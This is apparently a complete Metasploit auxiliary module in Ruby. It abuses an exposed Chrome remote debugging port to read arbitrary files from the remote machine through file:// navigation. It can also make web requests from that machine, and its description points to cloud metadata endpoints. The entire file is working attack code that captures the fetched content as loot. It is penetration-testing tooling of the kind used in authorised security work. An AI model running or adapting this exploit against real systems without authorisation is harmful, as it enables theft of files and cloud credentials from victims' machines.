class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Chrome Debugger Arbitrary File Read / Arbitrary Web Request',
      'Description' => %q{
        This module uses the Chrome Debugger's API to read
        files off the remote file system, or to make web requests
        from a remote machine.  Useful for cloud metadata endpoints!
      },
      'License' => MSF_LICENSE,
      'Author' => [
        'Adam Baldwin (Evilpacket)', # Original ideas, research, proof of concept, and msf module
        'Nicholas Starke (The King Pig Demon)' # msf module
      ],
      'Privileged' => false,
      'Targets' => [
      ],
      'DisclosureDate' => 'Sep 24 2019',
      'DefaultOptions' => {
      },
      'References'     =>
        [
          ['CVE', 'NONE']
        ],
      'DefaultTarget' => 0
    ))

    register_options(
      [
        Opt::RHOST,
        Opt::RPORT(9222),
        OptString.new('FilePath', [ false, 'File to fetch from remote machine.']),
        OptString.new('Url', [ false, 'Url to fetch from remote machine.'])

      ]
    )

    deregister_options('Proxies')
  end

  def run

    res = send_request_cgi({
        'uri' => '/json',
        'method' => 'GET',
    })

    if datastore['FilePath'].empty? and datastore['Url'].empty?
      print_error('Must set FilePath or Url')
      return
    end

    if res.nil?
      print_error('Bad Response')
    else
      data = JSON.parse(res.body).pop
      EM.run {
        file_path = datastore['FilePath']
        url = datastore['Url']

        if file_path
          fetch_uri = "file://#{file_path}"
        else
          fetch_uri = url
        end
        print_status("Attempting Connection to #{data['webSocketDebuggerUrl']}")

        driver = Faye::WebSocket::Client.new(data['webSocketDebuggerUrl'])

        driver.on :open do |event|
          print_status('Opened connection')
          id = rand(1024 * 1024 * 1024)

          EM::Timer.new(1) do
            print_status("Attempting to load url #{fetch_uri}")
            driver.send({
              'id' => id,
              'method' => 'Page.navigate',
              'params' => {
                'url':  fetch_uri,
              }
            }.to_json)
          end

          EM::Timer.new(3) do
            print_status('Sending request for data')
            driver.send({
              'id' => id + 1,
              'method' => 'Runtime.evaluate',
              'params' => {
                'expression' => 'document.documentElement.outerHTML'
              }
            }.to_json)
          end
        end

        driver.on :message do |event|
          print_status("Received Data")

          data = JSON.parse(event.data)

          if data['result']['result']
            print_good('Retrieved resource')
            store_loot('chrome.debugger.resource', 'text/plain', rhost, data['result']['result']['value'], fetch_uri, 'Resource Gathered via Chrome Debugger')
          end
        end

        EM::Timer.new(10) do
          EventMachine.stop
        end
      }
    end
  end
end

